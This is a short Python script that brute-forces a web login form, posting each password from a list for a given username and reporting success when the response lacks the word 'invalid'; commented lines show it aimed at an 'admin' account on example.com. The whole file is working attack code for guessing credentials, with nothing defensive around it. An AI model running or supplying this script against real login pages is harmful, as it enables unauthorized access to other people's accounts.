import requests

def brute_force(url, username, password_list):
    print(f"[+] Starting brute force on {url}")
    for password in password_list:
        data = {"username": username, "password": password.strip()}
        res = requests.post(url, data=data)
        if "invalid" not in res.text.lower():
            print(f"[SUCCESS] Password found: {password.strip()}")
            return
    print("[!] Password not found.")

# For testing:
# url = "http://example.com/login"
# brute_force(url, "admin", ["1234", "admin123", "password"])
